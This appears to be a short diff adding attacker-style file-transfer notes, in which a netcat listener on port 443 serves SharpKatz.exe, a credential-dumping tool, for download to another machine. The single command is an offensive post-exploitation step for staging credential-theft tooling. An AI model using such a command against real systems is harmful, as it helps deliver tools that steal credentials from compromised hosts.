@@ -1,0 +1,4 @@
+###### FILE_TRANSFER ######
+### LISTENING ###
+UPLOAD
+sudo nc -l -p 443 -q 0 < SharpKatz.exe
